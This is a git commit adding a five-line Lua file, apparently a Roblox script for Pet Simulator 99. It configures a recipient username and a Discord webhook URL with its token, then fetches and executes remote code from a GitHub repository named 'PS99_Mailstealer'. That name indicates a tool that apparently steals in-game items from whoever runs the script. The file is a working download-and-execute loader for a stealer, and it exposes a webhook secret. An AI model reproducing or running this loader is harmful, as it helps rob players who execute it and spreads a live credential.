cdf8a13a701394a175ca09b3c2c4b9e265982071
ps99scripttest <mtrxsup@gmail.com>
2024-12-18 20:13:26 +0200

    Add files via upload

---
+++ obf_QH98yo675LqVfBZIz8afHJGfADm23Yanpd4L6m8ch3Qrq3IRElT36jAh0PvXa5Tq.lua
@@ -0,0 +1,5 @@
+Username = "player365913"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1319001825214599240/NJcOmfWL1aLdGplv1EEQepF7EV28qEorLug-AJuGj_LIbNM1-n00X5-70gmxZpJ5IjC9"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
